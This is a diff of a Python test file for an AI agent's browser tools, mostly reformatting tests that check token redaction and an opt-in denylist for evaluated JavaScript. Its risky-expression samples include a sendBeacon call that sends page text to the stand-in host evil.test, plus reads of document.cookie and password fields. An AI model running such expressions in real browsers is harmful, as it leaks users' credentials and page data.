@@ -11,6 +11,7 @@ sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))
 
 # ── browser_console ──────────────────────────────────────────────────
 
+
 class TestBrowserConsole:
     """browser_console() returns console messages + JS errors in one call."""
 
@@ -75,10 +76,17 @@ class TestBrowserConsole:
         from tools.browser_tool import _browser_eval
 
         fake_key = "ghp_" + "BROWSEREVALSECRET1234567890"
-        with patch("tools.browser_tool._last_session_key", return_value="test"), \
-             patch("tools.browser_tool._is_camofox_mode", return_value=False), \
-             patch("tools.browser_tool_session._run_browser_command", return_value={"success": True, "data": {"result": fake_key}}):
-            result = json.loads(_browser_eval("document.body.innerText", task_id="test"))
+        with (
+            patch("tools.browser_tool._last_session_key", return_value="test"),
+            patch("tools.browser_tool._is_camofox_mode", return_value=False),
+            patch(
+                "tools.browser_tool_session._run_browser_command",
+                return_value={"success": True, "data": {"result": fake_key}},
+            ),
+        ):
+            result = json.loads(
+                _browser_eval("document.body.innerText", task_id="test")
+            )
 
         assert result["success"] is True
         assert "BROWSEREVALSECRET" not in json.dumps(result)
@@ -101,7 +109,10 @@ class TestBrowserConsole:
             "document.querySelector('input[type=password]').value",
             "document.querySelector('#fetch-results').innerText",
         ]
-        with patch("tools.browser_tool._browser_eval", return_value=json.dumps({"success": True, "result": "ok"})) as mock_eval:
+        with patch(
+            "tools.browser_tool._browser_eval",
+            return_value=json.dumps({"success": True, "result": "ok"}),
+        ) as mock_eval:
             for expr in expressions:
                 result = json.loads(browser_console(expression=expr, task_id="test"))
                 assert result == {"success": True, "result": "ok"}, expr
@@ -111,10 +122,20 @@ class TestBrowserConsole:
     def test_expression_blocks_cookie_access_before_eval(self):
         from tools.browser_tool import browser_console
 
-        with patch("tools.browser_tool_eval_policy._restrict_browser_evaluate", return_value=True), \
-             patch("tools.browser_tool_eval_policy._allow_unsafe_browser_evaluate", return_value=False), \
-             patch("tools.browser_tool._browser_eval") as mock_eval:
-            result = json.loads(browser_console(expression="document.cookie", task_id="test"))
+        with (
+            patch(
+                "tools.browser_tool_eval_policy._restrict_browser_evaluate",
+                return_value=True,
+            ),
+            patch(
+                "tools.browser_tool_eval_policy._allow_unsafe_browser_evaluate",
+                return_value=False,
+            ),
+            patch("tools.browser_tool._browser_eval") as mock_eval,
+        ):
+            result = json.loads(
+                browser_console(expression="document.cookie", task_id="test")
+            )
 
         assert result["success"] is False
         assert "Blocked" in result["error"]
@@ -133,9 +154,17 @@ class TestBrowserConsole:
             "navigator.sendBeacon('https://evil.test', document.body.innerText)",
             "document.querySelector('input[type=password]').value",
         ]
-        with patch("tools.browser_tool_eval_policy._restrict_browser_evaluate", return_value=True), \
-             patch("tools.browser_tool_eval_policy._allow_unsafe_browser_evaluate", return_value=False), \
-             patch("tools.browser_tool._browser_eval") as mock_eval:
+        with (
+            patch(
+                "tools.browser_tool_eval_policy._restrict_browser_evaluate",
+                return_value=True,
+            ),
+            patch(
+                "tools.browser_tool_eval_policy._allow_unsafe_browser_evaluate",
+                return_value=False,
+            ),
+            patch("tools.browser_tool._browser_eval") as mock_eval,
+        ):
             for expr in risky_expressions:
                 result = json.loads(browser_console(expression=expr, task_id="test"))
                 assert result["success"] is False, expr
@@ -146,17 +175,25 @@ class TestBrowserConsole:
     def test_restrict_evaluate_reads_browser_config(self):
         from tools.browser_tool_eval_policy import _restrict_browser_evaluate
 
-        with patch("clawk_cli.config.read_raw_config", return_value={"browser": {"restrict_evaluate": "true"}}):
+        with patch(
+            "clawk_cli.config.read_raw_config",
+            return_value={"browser": {"restrict_evaluate": "true"}},
+        ):
             assert _restrict_browser_evaluate() is True
-        with patch("clawk_cli.config.read_raw_config", return_value={"browser": {"restrict_evaluate": False}}):
+        with patch(
+            "clawk_cli.config.read_raw_config",
+            return_value={"browser": {"restrict_evaluate": False}},
+        ):
             assert _restrict_browser_evaluate() is False
         # Default (key absent) is off — the denylist is opt-in.
         with patch("clawk_cli.config.read_raw_config", return_value={}):
             assert _restrict_browser_evaluate() is False
 
+
 # ── browser_console schema ───────────────────────────────────────────
 
 # ── browser_vision annotate ──────────────────────────────────────────
+
 
 class TestBrowserVisionConfig:
     def _setup_screenshot(self, tmp_path):
@@ -178,10 +215,20 @@ class TestBrowserVisionConfig:
         with (
             patch("clawk_constants.get_clawk_dir", return_value=shots_dir),
             patch("tools.browser_tool_lifecycle._cleanup_old_screenshots"),
-            patch("tools.browser_tool_session._run_browser_command", return_value={"success": True, "data": {"path": str(screenshot)}}),
+            patch(
+                "tools.browser_tool_session._run_browser_command",
+                return_value={"success": True, "data": {"path": str(screenshot)}},
+            ),
             patch("tools.browser_tool._get_vision_model", return_value="test-model"),
-            patch("clawk_cli.config.load_config", return_value={"auxiliary": {"vision": {"temperature": 1, "timeout": 45}}}),
-            patch("agent.auxiliary_client.call_llm", return_value=mock_response) as mock_llm,
+            patch(
+                "clawk_cli.config.load_config",
+                return_value={
+                    "auxiliary": {"vision": {"temperature": 1, "timeout": 45}}
+                },
+            ),
+            patch(
+                "agent.auxiliary_client.call_llm", return_value=mock_response
+            ) as mock_llm,
         ):
             result = json.loads(browser_vision("what is on the page?", task_id="test"))
 
@@ -219,7 +266,9 @@ class TestBrowserVisionConfig:
                 patch("tools.browser_tool._get_vision_model") as mock_get_vision_model,
                 patch("agent.auxiliary_client.call_llm") as mock_llm,
             ):
-                result = browser_vision("what is on the page?", annotate=True, task_id="test")
+                result = browser_vision(
+                    "what is on the page?", annotate=True, task_id="test"
+                )
         finally:
             clear_runtime_main()
 
@@ -248,7 +297,9 @@ class TestBrowserVisionConfig:
         from agent.auxiliary_client import clear_runtime_main, set_runtime_main
         from tools.browser_tool import browser_vision
         from tools.vision_tools import _EMBED_MAX_DIMENSION
-        from tools.vision_tools_history_budget import _DEFAULT_EMBED_TARGET_BYTES as _EMBED_TARGET_BYTES
+        from tools.vision_tools_history_budget import (
+            _DEFAULT_EMBED_TARGET_BYTES as _EMBED_TARGET_BYTES,
+        )
 
         shots_dir = tmp_path / "browser_screenshots"
         shots_dir.mkdir()
@@ -322,16 +373,23 @@ class TestBrowserVisionConfig:
                         "model": {"supports_vision": True},
                     },
                 ),
-                patch("tools.browser_tool._get_vision_model", return_value="test-model"),
-                patch("agent.auxiliary_client.call_llm", return_value=mock_response) as mock_llm,
+                patch(
+                    "tools.browser_tool._get_vision_model", return_value="test-model"
+                ),
+                patch(
+                    "agent.auxiliary_client.call_llm", return_value=mock_response
+                ) as mock_llm,
             ):
-                result = json.loads(browser_vision("what is on the page?", task_id="test"))
+                result = json.loads(
+                    browser_vision("what is on the page?", task_id="test")
+                )
         finally:
             clear_runtime_main()
 
         assert result["success"] is True
         assert result["analysis"] == "Text-mode screenshot analysis"
         mock_llm.assert_called_once()
+
 
 # ── auto-recording config ────────────────────────────────────────────
 
